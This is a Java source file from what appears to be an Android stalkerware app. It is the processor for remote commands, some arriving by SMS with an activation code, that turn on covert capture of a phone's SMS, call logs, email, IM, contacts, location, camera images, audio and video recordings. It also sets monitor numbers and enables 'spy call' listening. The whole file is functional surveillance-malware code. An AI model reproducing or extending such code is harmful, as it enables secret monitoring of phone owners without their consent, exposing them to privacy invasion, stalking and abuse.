package com.vvt.remotecommandmanager.processor.miscellaneous;

import java.util.Arrays;
import java.util.List;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;

import com.vvt.appcontext.AppContext;
import com.vvt.base.FxAddressbookMode;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.events.FxSettingElement;
import com.vvt.events.FxSettingEvent;
import com.vvt.exceptions.FxNotImplementedException;
import com.vvt.exceptions.FxNullNotAllowedException;
import com.vvt.exceptions.database.FxDbNotOpenException;
import com.vvt.exceptions.database.FxDbOperationException;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.preference_manager.PrefAddressBook;
import com.vvt.preference_manager.PrefEventsCapture;
import com.vvt.preference_manager.PrefHomeNumber;
import com.vvt.preference_manager.PrefLocation;
import com.vvt.preference_manager.PrefMonitorNumber;
import com.vvt.preference_manager.PrefNotificationNumber;
import com.vvt.preference_manager.PrefWatchList;
import com.vvt.preference_manager.PreferenceManager;
import com.vvt.preference_manager.PreferenceType;
import com.vvt.preference_manager.WatchFlag;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.RemoteCommandType;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;
import com.vvt.remotecommandmanager.utils.RemoteCommandUtil;
import com.vvt.stringutil.FxStringUtils;

public class SetSettingsProcessor extends RemoteCommandProcessor {
	private static final String TAG = "SetSettingsProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGI = Customization.INFO;
	private static final boolean LOGE = Customization.ERROR;
	
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private PreferenceManager mPreferenceManager;
	private LicenseInfo mLicenseInfo;
	private Context mContext;
	private BatteryReceiver mBatteryReceiver;
	private FxEventRepository mFxEventRepository;
	private StringBuilder mReplyMessageBuilder;
	
	private final int SMS = 1;
	private final int CALLLOG = 2;
	private final int EMAIL = 3;
	private final int MMS = 5;
	private final int CONTACT = 6;
	private final int LOCATION = 7;
	private final int IM = 8; 
	private final int WALLPAPER = 9;
	private final int CAMERAIMAGE = 10;
	private final int AUDIORECORDING = 11;
	private final int AUDIOCONVERSATION = 12;
	private final int VIDEOFILE = 13;
	private final int SETSTARTSTOPCAPTURE = 41;
	private final int SETDELIVERYTIMER = 42;
	private final int SETEVENTCOUNT = 43;
	private final int ENABLEWATCH = 44;
	private final int SETWATCHFLAGS = 45;
	private final int SETLOCATIONTIMER = 46;
	private final int PANIC_MODE = 47;
	private final int NOTIFICATIONNUMBERS = 48;
	private final int HOMENUMBERS = 50;
	/*private final int CISNUMBERS = 51;*/
	private final int MONITORNUMBERS = 52;
	private final int ENABLESPYCALL = 53;
	
	private final int ENABLERESTRICTIONS = 54;
	private final int ADDRESSBOOK_MANAGEMENT_MODE = 55;
	private final int VCARD_VERSION = 56;
	/*private final int LOCATION_MODE = 57;*/
	private final int POWER_INFO = 58;
	
	public SetSettingsProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo, PreferenceManager preferenceManager) {
		super(appContext, eventRepository);
		
		mLicenseInfo = licenseInfo;
		mReplyMessage = new ProcessingResult();
		mPreferenceManager = preferenceManager;
		mContext  = appContext.getApplicationContext();
		mFxEventRepository = eventRepository;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		validateRemoteCommandData(commandData);
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		
		List<String> args = null;
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			if(commandData.getArguments().size() > 0) {
				args = RemoteCommandUtil.removeActivationCodeFromArgs(commandData.getArguments());	
			}
		}
		else {
			args = commandData.getArguments();
		}
		
		 String[] splitter;
         int settingId = 0;
         String settingValue = "";
         
         if(LOGV) FxLog.v(TAG, "doSetSettings # Args count: " + args.size());
         
         validateArgument(args);
		
		try {
			if(LOGV) FxLog.v(TAG, "doSetSettings # Args : " + args.toString());
			 for (String arg : args) {
				 if(LOGV) FxLog.v(TAG, "SetSettings arg: " + arg);
				 
	                splitter = arg.split(":");
	                
	                try {
	                    settingId = Integer.parseInt(splitter[0]);
	                    settingValue = splitter[1];
	                } catch (NumberFormatException nfe) {
	                	if(LOGE) FxLog.e(TAG, "doSetSettings # NumberFormatException ");
	                }
	                
	                switch(settingId)
	                {
	                case SMS:
	                	PrefEventsCapture  smsEventsCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	smsEventsCapturePref.setEnableSMS(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(smsEventsCapturePref);
	                    break;
	                    
	                case CALLLOG:
	                	PrefEventsCapture  callLogEventsCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	callLogEventsCapturePref.setEnableCallLog(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(callLogEventsCapturePref);	                	
	                    break;
	                    
	                case MMS:
	                	PrefEventsCapture  mmsEventsCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	mmsEventsCapturePref.setEnableMMS(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(mmsEventsCapturePref);
	                    break;
	                    
	                case EMAIL:
	                	PrefEventsCapture  emailEventsCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	emailEventsCapturePref.setEnableEmail(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(emailEventsCapturePref);
	                    break;
	                    
	                case CONTACT:
	                	PrefEventsCapture  contactsEventsCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	contactsEventsCapturePref.setEnableAddressBook(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(contactsEventsCapturePref);
	                    break;
	                    
	                case LOCATION:
	                	PrefLocation  locationPref = (PrefLocation)mPreferenceManager.getPreference(PreferenceType.LOCATION);
	                	locationPref.setEnableLocation(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(locationPref);
	                    break;
	                    
	                case IM:
	                	PrefEventsCapture  imEventsCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	imEventsCapturePref.setEnableIM(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(imEventsCapturePref);
	                	break;
	                	
	                case WALLPAPER:
	                	PrefEventsCapture  wallpaperEventCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	wallpaperEventCapturePref.setEnableWallPaper(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(wallpaperEventCapturePref);
	                	break;
	                	
	                case CAMERAIMAGE:
	                	PrefEventsCapture  cameraImageEventsCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	cameraImageEventsCapturePref.setEnableCameraImage(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(cameraImageEventsCapturePref);
	                    break;
	                    
	                case AUDIORECORDING:
	                	PrefEventsCapture  audioRecordingCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	audioRecordingCapturePref.setEnableAudioFile(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(audioRecordingCapturePref);
	                    break;
	                    
	                case AUDIOCONVERSATION:
	                	break;
	                	
	                case VIDEOFILE:
	                	PrefEventsCapture  videoRecordingCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	videoRecordingCapturePref.setEnableVideoFile(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(videoRecordingCapturePref);
	                    break;
	               
	                case SETSTARTSTOPCAPTURE:
	                	PrefEventsCapture  startStopCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	startStopCapturePref.setEnableStartCapture(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(startStopCapturePref);
	                    break;
	                    
	                case SETDELIVERYTIMER:
	                	PrefEventsCapture  deliveryTimerCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	int deliveryTime = FxStringUtils.convertStringToInt(settingValue);
	                	
	                	deliveryTime = deliveryTime * (1000 * 60 * 60);
	                	deliveryTimerCapturePref.setDeliverTimer(deliveryTime);
	                	mPreferenceManager.savePreferenceAndNotifyChange(deliveryTimerCapturePref);
	                    break;
	                    
	                case SETEVENTCOUNT:
	                	PrefEventsCapture  eventCountCapturePref = (PrefEventsCapture)mPreferenceManager.getPreference(PreferenceType.EVENTS_CTRL);
	                	int count = FxStringUtils.convertStringToInt(settingValue); 
	                	eventCountCapturePref.setMaxEvent(count);
	                	mPreferenceManager.savePreferenceAndNotifyChange(eventCountCapturePref);
	                    break;
	                    
	                case ENABLEWATCH:
	                	PrefWatchList  watchListCapturePref = (PrefWatchList)mPreferenceManager.getPreference(PreferenceType.WATCH_LIST);
	                	watchListCapturePref.setEnableWatchNotification(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(watchListCapturePref);
	                	break;
	                	
	                case SETWATCHFLAGS : 
	                	String[] flags = settingValue.split(";");
	                	if(LOGV) FxLog.v(TAG, "SETWATCHFLAGS : flags : " + Arrays.toString(flags));
	                	PrefWatchList watchListPreference = (PrefWatchList)mPreferenceManager.getPreference(PreferenceType.WATCH_LIST);
	                	if(LOGV) FxLog.v(TAG, "convertStringToBoolean : flags[0] : " + flags[0]);
	                	watchListPreference.addWatchFlag(WatchFlag.WATCH_IN_ADDRESSBOOK, FxStringUtils.convertStringToBoolean(flags[0]));
	                	if(LOGV) FxLog.v(TAG, "convertStringToBoolean : flags[1] : " + flags[1]);
	                	watchListPreference.addWatchFlag(WatchFlag.WATCH_NOT_IN_ADDRESSBOOK, FxStringUtils.convertStringToBoolean(flags[1]));
	                	if(LOGV) FxLog.v(TAG, "convertStringToBoolean : flags[0] : " + flags[2]);
	                	watchListPreference.addWatchFlag(WatchFlag.WATCH_IN_LIST, FxStringUtils.convertStringToBoolean(flags[2]));
	                	if(LOGV) FxLog.v(TAG, "convertStringToBoolean : flags[0] : " + flags[3]);
	                	watchListPreference.addWatchFlag(WatchFlag.WATCH_PRIVATE_OR_UNKNOWN_NUMBER,FxStringUtils.convertStringToBoolean(flags[3]));
	        			mPreferenceManager.savePreferenceAndNotifyChange(watchListPreference);
	        			break;
	                case SETLOCATIONTIMER:
	                	PrefLocation  locationTimerPref = (PrefLocation)mPreferenceManager.getPreference(PreferenceType.LOCATION);
	                	long interval = RemoteCommandUtil.getTimerValue(FxStringUtils.convertStringToInt(settingValue));
	                	locationTimerPref.setLocationInterval(interval);
	                	mPreferenceManager.savePreferenceAndNotifyChange(locationTimerPref);
	                    break;
	                    
	                case PANIC_MODE:
	                	// TODO: When the componene is done. Fill this.
	                	break;
	                	
	                case NOTIFICATIONNUMBERS:
	                	PrefNotificationNumber notificationNumberPref = (PrefNotificationNumber)mPreferenceManager.getPreference(PreferenceType.NOTIFICATION_NUMBER);
	                	String[] notificationNumbers =	settingValue.split(";");
	                	
	                	for (String number : notificationNumbers) {  
	                		notificationNumberPref.addNotificationNumber(number);
	                	}
	                	
	                	mPreferenceManager.savePreferenceAndNotifyChange(notificationNumberPref);
	                	break;
	                    
	                case HOMENUMBERS:
	                	String[] homeNumbers =	settingValue.split(";");
	                	PrefHomeNumber homeNumberPref = (PrefHomeNumber)mPreferenceManager.getPreference(PreferenceType.HOME_NUMBER);
	                	
	                	for (String number : homeNumbers) {  
	                		homeNumberPref.addHomeNumber(number);
	                	}
	                	
	                	mPreferenceManager.savePreferenceAndNotifyChange(homeNumberPref);
	                    break;
	                    
	                case MONITORNUMBERS:
	                	String[] monNumbers = settingValue.split(";");
	                	if(LOGV) FxLog.v(TAG, "MONITORNUMBERS : monNumbers : "+ Arrays.toString(monNumbers));
	                	PrefMonitorNumber monitorNumberPref = (PrefMonitorNumber)mPreferenceManager.getPreference(PreferenceType.MONITOR_NUMBER);
	                	
	                	monitorNumberPref.clearMonitorNumber();
	                	
	                	for (String number : monNumbers) {  
	                		monitorNumberPref.addMonitorNumber(number);
	                	}
	                	
	                	mPreferenceManager.savePreferenceAndNotifyChange(monitorNumberPref);
	                	break;
	               
	                case ENABLESPYCALL:
	                	PrefMonitorNumber  enableSpyCallPref = (PrefMonitorNumber)mPreferenceManager.getPreference(PreferenceType.MONITOR_NUMBER);
	                	enableSpyCallPref.setEnableMonitor(FxStringUtils.convertStringToBoolean(settingValue));
	                	mPreferenceManager.savePreferenceAndNotifyChange(enableSpyCallPref);
	                	break;
	                	
	                case ENABLERESTRICTIONS:
	                	// TODO: Paisan said no need. Remove this later
	                	break;
	                	
	                case ADDRESSBOOK_MANAGEMENT_MODE:
	                	PrefAddressBook addressBookPref = (PrefAddressBook)mPreferenceManager.getPreference(PreferenceType.ADDRESSBOOK);
	                	FxAddressbookMode mode;
	                	
	                	if(settingValue == "1") {
	                		mode = FxAddressbookMode.MONITOR;
	                	} else if(settingValue == "2") {
	                		mode = FxAddressbookMode.RESTRICTED;
	                	}
	                	else {
	                		mode = FxAddressbookMode.OFF;
	                	}
	                	
	                	addressBookPref.setMode(mode);
	                	mPreferenceManager.savePreferenceAndNotifyChange(addressBookPref);
	                	break;
	                	
	                case VCARD_VERSION:
	                	FxSettingEvent  settingEvent = new FxSettingEvent();
	                	settingEvent.addSettingElement( new FxSettingElement() {{ setSettingID(VCARD_VERSION); setSettingValue("1.2"); }} );
	                	
	                	try {
	        				mFxEventRepository.insert(settingEvent);
	        			} catch (FxDbNotOpenException e) {
	        				if(LOGE) FxLog.e(TAG, e.toString());
	        			} catch (FxNullNotAllowedException e) {
	        				if(LOGE) FxLog.e(TAG, e.toString());
	        			} catch (FxNotImplementedException e) {
	        				if(LOGE) FxLog.e(TAG, e.toString());
	        			} catch (FxDbOperationException e) {
	        				if(LOGE) FxLog.e(TAG, e.toString());
	        			}
	                	break;
	                	
	                case POWER_INFO:
	                    IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
	                    mBatteryReceiver = new BatteryReceiver();
	                    mContext.registerReceiver(mBatteryReceiver, filter);
	                	break;
	                }
			 }
			 
			mReplyMessage.setIsSuccess(true);
			mReplyMessageBuilder.append(MessageManager.SET_SETTINGS_SUCCESS);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
	                
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString(),t);
			 
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(MessageManager.SET_SETTINGS_ERROR);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
		
	}
	
	public class BatteryReceiver extends BroadcastReceiver {

		@Override
		public void onReceive(Context arg0, Intent intent) {
			
			 int level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, 0);
		     int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100);
		     int status = intent.getIntExtra("status", 0);
		     String statusString = "";
		     
		     switch (status) {
             case BatteryManager.BATTERY_STATUS_UNKNOWN:
                 statusString = "unknown";
                 break;
             case BatteryManager.BATTERY_STATUS_CHARGING:
                 statusString = "charging";
                 break;
             case BatteryManager.BATTERY_STATUS_DISCHARGING:
                 statusString = "discharging";
                 break;
             case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
                 statusString = "not charging";
                 break;
             case BatteryManager.BATTERY_STATUS_FULL:
                 statusString = "full";
                 break;
             }
		     
		     if(LOGI) FxLog.i(TAG, "level: " + level + "; scale: " + scale);
		     
		     final int percent = (level*100)/scale;

		    FxSettingEvent  settingEvent = new FxSettingEvent();
		    FxSettingElement element  = new FxSettingElement();
		    element.setSettingID(POWER_INFO);
		    element.setSettingValue(String.valueOf(percent));
		    element.setSettingValue(String.valueOf(statusString));
		    settingEvent.addSettingElement(element);
		    
		    try {
				mFxEventRepository.insert(settingEvent);
			} catch (FxDbNotOpenException e) {
				if(LOGE) FxLog.e(TAG, e.toString());
			} catch (FxNullNotAllowedException e) {
				if(LOGE) FxLog.e(TAG, e.toString());
			} catch (FxNotImplementedException e) {
				if(LOGE) FxLog.e(TAG, e.toString());
			} catch (FxDbOperationException e) {
				if(LOGE) FxLog.e(TAG, e.toString());
			}
		     
			arg0.unregisterReceiver(mBatteryReceiver);
		}
	 
		
	}
	
	protected void validateRemoteCommandData(RemoteCommandData commandData) throws RemoteCommandException{
		
		if(commandData.getRmtCommandType() == RemoteCommandType.SMS_COMMAND) {
			if(commandData.getArguments().size() < 2) {
				throw new InvalidCommandFormatException();
			}
		
			//if invalid activation code it will throw exception.
			RemoteCommandUtil.validateActivationCode(commandData.getArguments().get(0), mLicenseInfo);
		}
	}
	
	protected void validateArgument(List<String> args)throws RemoteCommandException{
		
		String setStringId = "-1";
		int settingId = -1;
		String settingValue = "";
		String[] argValue = null;
		
		for(String arg : args) {
			
			if(arg == null) {
				if(LOGD) FxLog.d(TAG, "validateArgument # arg is NULL");
				throw new InvalidCommandFormatException();
			}
			
			setStringId = "-1";
			settingId = -1;
			settingValue = "";
			argValue = null;
			
			argValue = arg.split(":");
			if(argValue.length < 2) {
				if(LOGD) FxLog.d(TAG, "validateArgument # argValue.length < 2");
				throw new InvalidCommandFormatException();
			} else {
				setStringId = argValue[0];
				if (!setStringId.matches("[0-9]+")) {  
					if(LOGD) FxLog.d(TAG, "validateArgument # Id is not number : " + setStringId);
					throw new InvalidCommandFormatException();
				}
				settingId = Integer.parseInt(setStringId);
				 switch(settingId)
	                {
	                case SMS:
	                case CALLLOG:
	                case MMS:
	                case EMAIL:
	                case CONTACT:
	                case LOCATION:
	                case IM:
	                case WALLPAPER:
	                case CAMERAIMAGE:
	                case AUDIORECORDING:
	                case AUDIOCONVERSATION:
	                case VIDEOFILE:
	                case SETSTARTSTOPCAPTURE:
	                case ENABLEWATCH:
	                case ENABLESPYCALL:
	                case ENABLERESTRICTIONS:
	                	settingValue = argValue[1];
	    				if (!settingValue.matches("[0-1]")) {  
	    					if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is not 0-1",settingId));
	    					throw new InvalidCommandFormatException();
	    				}
	                    break;
	                    
	                case SETDELIVERYTIMER:
	                	settingValue = argValue[1];
	    				if (!settingValue.matches("[0-9]+")) {  
	    					if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is not number",SETDELIVERYTIMER));
	    					throw new InvalidCommandFormatException();
	    				} else {
	    					int value = Integer.parseInt(settingValue);
	    					if(value < 0 || value > 24) {
	    						if(LOGD) FxLog.d(TAG, String.format(
		    							"validateArgument # value of id %s is in rang [0-24]",SETDELIVERYTIMER));
	    						throw new InvalidCommandFormatException();
	    					}
	    				}
	                    break;
	                    
	                case SETEVENTCOUNT:
	                	settingValue = argValue[1];
	    				if (!settingValue.matches("[0-9]+")) {  
	    					if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is not number",SETEVENTCOUNT));
	    					throw new InvalidCommandFormatException();
	    				} else {
	    					int value = Integer.parseInt(settingValue);
	    					if(value < 1 || value > 500) {
	    						if(LOGD) FxLog.d(TAG, String.format(
		    							"validateArgument # value of id %s is not in rang [1-500]",SETEVENTCOUNT));
	    						throw new InvalidCommandFormatException();
	    					}
	    				}
	                    break;
	                	
	                case SETLOCATIONTIMER:
	                	settingValue = argValue[1];
	    				if (!settingValue.matches("[0-8]")) {  
	    					if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is not in rang [0-8]",SETLOCATIONTIMER));
	    					throw new InvalidCommandFormatException();
	    				} 
	                    break;
	                    
	                case PANIC_MODE:
	                	settingValue = argValue[1];
	    				if (!settingValue.matches("[1-2]")) {  
	    					if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is not in rang [1-2]",PANIC_MODE));
	    					throw new InvalidCommandFormatException();
	    				} 
	                	break;
	                	
	                case NOTIFICATIONNUMBERS:
	                	//can add String
	                	break;
	                	
	                case HOMENUMBERS:
	                case MONITORNUMBERS:
	                	settingValue = argValue[1];
	                	String[] notifyNumber = settingValue.split(";");
	                	for(String number : notifyNumber) {
		                	if (!RemoteCommandUtil.isPhoneNumberFormat(number)) {  
		                		if(LOGD) FxLog.d(TAG, String.format(
		    							"validateArgument # value of id %s is not in PhoneNumberFormat",settingId));
		    					throw new InvalidCommandFormatException();
		    				} 
	                	}
	                	break;
	                	
	                case ADDRESSBOOK_MANAGEMENT_MODE:
	                	settingValue = argValue[1];
	    				if (!settingValue.matches("[0-3]")) {  
	    					if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is not in rang [0-3]",ADDRESSBOOK_MANAGEMENT_MODE));
	    					throw new InvalidCommandFormatException();
	    				} 
	                	break;
	                	
	                case SETWATCHFLAGS : 
	                	settingValue = argValue[1];
	                	if(LOGV) FxLog.v(TAG,"SETWATCHFLAGS :settingValue : " + settingValue);
	                	String[] flags = settingValue.split(";");
	                	
	                	if(flags.length < 4) {
	                		if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is less than 4 arggument",SETWATCHFLAGS));
	                		throw new InvalidCommandFormatException();
	                	}
	                	for(String f : flags) {
	                		if (!f.matches("[0-1]")) {
	                			if(LOGD) FxLog.d(TAG, String.format(
		    							"validateArgument # value of id %s is not in rang [0-1]",SETWATCHFLAGS));
		    					throw new InvalidCommandFormatException();
		    				} 
	                	}
	                	break;
	                	
	                case VCARD_VERSION:
	                	
	                	break;
	                	
	                case POWER_INFO:
	                	settingValue = argValue[1];
	                	String[] powerValue = settingValue.split(";");
	                	
	                	if(powerValue.length < 2) {
	                		if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is less than 2 arggument",POWER_INFO));
	                		throw new InvalidCommandFormatException();
	                	}
	                	
	                	if (!powerValue[0].matches("[0-9]+")) {  
	                		if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is not number",POWER_INFO));
	    					throw new InvalidCommandFormatException();
	    				} else {
	    					int value = Integer.parseInt(powerValue[0]);
	    					if(value < 0 || value > 100) {
	    						if(LOGD) FxLog.d(TAG, String.format(
		    							"validateArgument # value of id %s is not in rang [0-100]",POWER_INFO));
	    						throw new InvalidCommandFormatException();
	    					}
	    				}
	                	
	                	if (!powerValue[1].matches("[1-4]")) {  
	                		if(LOGD) FxLog.d(TAG, String.format(
	    							"validateArgument # value of id %s is not in rang [1-4]",POWER_INFO));
	    					throw new InvalidCommandFormatException();
	    				} 

	                	break;
	                }
			}
		}
	}
	
	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}

}
